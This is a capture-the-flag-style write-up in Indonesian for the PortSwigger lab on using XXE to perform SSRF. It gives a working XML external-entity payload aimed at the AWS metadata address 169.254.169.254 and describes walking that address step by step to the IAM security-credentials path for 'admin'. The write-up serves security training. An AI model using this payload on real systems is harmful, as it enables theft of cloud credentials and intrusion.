# Write-Up: XXE + SSRF Attack

## 1. Informasi Lab

*   **Sumber**: PortSwigger Web Security Academy
*   **Link Lab**: [https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)
*   **Nama Lab**: Exploiting XXE to perform SSRF attacks
*   **Vulnerability**: XML External Entity (XXE) Injection + Server-Side Request Forgery (SSRF)

## 2. Deskripsi Lab

Lab ini menggabungkan dua kerentanan. Tujuannya adalah menggunakan kerentanan XXE pada parser XML untuk melakukan serangan SSRF. Serangan ini akan memaksa server untuk terhubung ke alamat IP internal (`169.254.169.254`) secara bertahap untuk menemukan dan mengambil kunci rahasia IAM dari endpoint metadata AWS.

## 3. Analisis Kerentanan

Aplikasi memproses data XML dari pengguna dan mengizinkan entitas eksternal. Dengan mendefinisikan entitas yang mengarah ke URL internal, penyerang dapat membuat server mengirim permintaan HTTP. Data dari respons permintaan internal ini kemudian ditampilkan sebagai error `Invalid product ID`, yang memungkinkan penyerang untuk "menjelajahi" direktori di server internal secara bertahap.

## 4. Langkah-Langkah Eksploitasi

Eksploitasi ini bersifat iteratif (berulang) dan memerlukan beberapa langkah:

1.  **Intersepsi Permintaan**: Tangkap permintaan `POST` dari fitur "Check stock" di Burp Suite. Permintaan ini berisi data XML.

2.  **Langkah 1 (Payload Awal)**:
    *   Suntikkan payload XXE untuk mengarahkan permintaan ke alamat IP internal awal.
    *   **Payload XML**:
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
        <stockCheck>
          <productId>&xxe;</productId>
          <storeId>1</storeId>
        </stockCheck>
        ```
    *   Kirimkan *request* dan perhatikan respons yang berisi `latest/`.

3.  **Langkah 2 (Iterasi)**:
    *   Secara berulang, perbarui URL di dalam payload dengan menambahkan setiap direktori baru yang ditemukan di respons server (misalnya: `latest/`, lalu `meta-data/`, lalu `iam/`, lalu `security-credentials/`).
    *   Proses ini dilakukan hingga Anda menemukan petunjuk terakhir, yaitu `admin`.

4.  **Langkah Terakhir (Mendapatkan Kunci)**:
    *   Setelah menemukan petunjuk `admin`, gunakan URL lengkap berikut di dalam payload:
        `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin`
    *   Kirimkan permintaan terakhir. Lab akan langsung ditandai sebagai **Solved**.

## 5. Kesimpulan

Eksploitasi ini menunjukkan bagaimana kerentanan XXE dapat digunakan sebagai "pembuka" untuk melakukan serangan SSRF yang lebih berbahaya. Dengan memaksa server terhubung ke *endpoint* internalnya sendiri, penyerang berhasil mengakses data sensitif yang seharusnya tidak dapat diakses dari luar.

## Bukti 
<img width="1920" height="1080" alt="Screenshot 2025-09-10 113342" src="https://github.com/user-attachments/assets/67c56563-1c40-408d-87dc-8cd57d779ed4" />

<img width="1920" height="1080" alt="Screenshot 2025-09-10 113540" src="https://github.com/user-attachments/assets/82f7d1a9-6074-4053-a048-927bb65f494a" />

<img width="1277" height="555" alt="Screenshot 2025-09-10 113710" src="https://github.com/user-attachments/assets/152db7a5-25c1-4ca0-a4b0-b1b8a61bfd4d" />

<img width="1919" height="819" alt="Screenshot 2025-09-10 114223" src="https://github.com/user-attachments/assets/40b91278-fec7-4798-b40c-4fd1d8dbc608" />

<img width="1308" height="496" alt="Screenshot 2025-09-10 114331" src="https://github.com/user-attachments/assets/2e8ba021-f40b-468f-8825-8090f431d221" />

<img width="1910" height="587" alt="Screenshot 2025-09-10 114411" src="https://github.com/user-attachments/assets/85f52abf-eed0-4566-897c-82aab36e411f" />

<img width="1444" height="690" alt="Screenshot 2025-09-10 114453" src="https://github.com/user-attachments/assets/6a36e416-5766-4dd0-b857-3b64a398b876" />

<img width="1914" height="581" alt="Screenshot 2025-09-10 114513" src="https://github.com/user-attachments/assets/5a4afe26-651e-4a3b-88b2-c2bbc59b71cd" />

<img width="1416" height="740" alt="Screenshot 2025-09-10 114624" src="https://github.com/user-attachments/assets/d8c179f9-f543-4ff6-b85b-2f1ac40770be" />

<img width="1906" height="600" alt="Screenshot 2025-09-10 114638" src="https://github.com/user-attachments/assets/7b8b06e0-9ba6-485d-a5d5-e2ceaffd9668" />

<img width="1269" height="624" alt="Screenshot 2025-09-10 114727" src="https://github.com/user-attachments/assets/ff010938-e259-4587-b71b-9fecfce32474" />

<img width="1917" height="576" alt="Screenshot 2025-09-10 114743" src="https://github.com/user-attachments/assets/cf4abefa-8642-420b-b225-7a1ace0d6f31" />

<img width="1919" height="867" alt="Screenshot 2025-09-10 114842" src="https://github.com/user-attachments/assets/012247de-67e8-413d-b818-36f39ad4c6b2" />

<img width="1919" height="1079" alt="Screenshot 2025-09-10 115401" src="https://github.com/user-attachments/assets/315df4a0-8279-4145-a304-e401d0ab91c2" />
